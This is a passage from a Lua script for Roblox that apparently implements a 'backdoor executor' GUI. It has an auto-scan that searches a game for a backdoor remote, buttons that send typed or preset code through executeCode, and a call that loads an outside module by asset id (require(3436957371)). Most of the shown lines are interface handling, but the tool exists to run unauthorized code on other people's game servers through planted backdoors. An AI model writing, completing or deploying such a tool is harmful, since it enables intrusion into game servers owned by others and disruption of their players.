		task.spawn(function()
			findRemote()
			if not backdoor then updateUI("idle")end
			searching=false
		end)
	end)
end

local function EXEC_fake_script()
	Converted["_ExecBtn"].MouseButton1Click:Connect(function() executeCode(Converted["_CodeInput"].Text) end)
	Converted["_ClearBtn"].MouseButton1Click:Connect(function() Converted["_CodeInput"].Text="" end)
	Converted["_R6Btn"].MouseButton1Click:Connect(function() executeCode('require(3436957371):r6("'..player.Name..'")') end)
	Converted["_ReBtn"].MouseButton1Click:Connect(function()
		local code='local target = "'..player.Name..'"\nfor _, p in ipairs(game:GetService("Players"):GetPlayers()) do\n    if p.Name == target then\n        p:LoadCharacter()\n        break\n    end\nend'
		executeCode(code)
	end)
	Converted["_CopyBtn"].MouseButton1Click:Connect(function()
		local text=Converted["_CodeInput"].Text
		if text==""then notify("Nothing to copy");return end
		if clipboardFn then
			local ok=pcall(clipboardFn,text)
			if ok then notify("Code copied to clipboard") else notify("Copy failed") end
		else notify("Clipboard unavailable") end
	end)
end

local function TEXTBOX_fake_script()
	Converted["_CodeInput"]:GetPropertyChangedSignal("Text"):Connect(function()
		updateCodeBox()
		updateHighlight()
	end)
	Converted["_CodeInput"].Focused:Connect(function()
		Converted["_CodeStroke"].Color=(currentTheme=="purple")and Color3.fromRGB(180,80,255)or Color3.fromRGB(255,255,255)
		Converted["_CodeStroke"].Transparency=0.2
	end)
	Converted["_CodeInput"].FocusLost:Connect(function()
		Converted["_CodeStroke"].Color=(currentTheme=="purple")and Color3.fromRGB(90,40,130)or Color3.fromRGB(80,80,80)
		Converted["_CodeStroke"].Transparency=0.5
	end)
end

local function ALT_KEY_fake_script()
	userInput.InputBegan:Connect(function(input,processed)
		if input.KeyCode==Enum.KeyCode.LeftAlt and not processed then
			if Converted["_MainFrame"].Visible then
				Converted["_MainFrame"].Visible=false
				Converted["_ReopenBtn"].Visible=true
			else
				Converted["_MainFrame"].Visible=true
				Converted["_ReopenBtn"].Visible=false
			end
		end
	end)
end

local function SCALE_fake_script()
	if not isMobile then return end

	local ms=Instance.new("UIScale")
	ms.Name="EpicScale"
	ms.Scale=0.95
	ms.Parent=Converted["_MainFrame"]

	local mos=Instance.new("UIScale")
	mos.Name="EpicScale"
	mos.Scale=0.95
	mos.Parent=ModalOverlay

	local rs=Instance.new("UIScale")
	rs.Name="EpicScale"
	rs.Scale=1.15
	rs.Parent=Converted["_ReopenBtn"]
end

local function INIT_fake_script()
	applyTheme("black")
	updateModeButtons()
	updateCategoryTabs()
	updateHighlight()
	updateUI("idle")
	switchTab("executor")
	logMessage("info","Executor v1.3.9 loaded")

	if autoScanState then
		task.wait(0.4)
		if not searching and not backdoor then
			logMessage("info","Auto scan starting...")
			searching=true
			hasScanned=true
			updateUI("scanning")
			task.spawn(function()
				findRemote()
				if not backdoor then updateUI("idle")end
				searching=false
			end)
		end
	end
end

coroutine.wrap(DRAG_fake_script)()
coroutine.wrap(REOPEN_DRAG_fake_script)()
coroutine.wrap(REOPEN_SPIN_fake_script)()
coroutine.wrap(ICON_SPIN_fake_script)()
coroutine.wrap(CLOSE_fake_script)()
coroutine.wrap(BTN_fake_script)()
coroutine.wrap(SCRIPTS_fake_script)()
coroutine.wrap(SCAN_fake_script)()
coroutine.wrap(EXEC_fake_script)()
coroutine.wrap(TEXTBOX_fake_script)()
coroutine.wrap(ALT_KEY_fake_script)()
task.spawn(function() SCALE_fake_script() end)
task.spawn(function() task.wait(0.3) INIT_fake_script() end)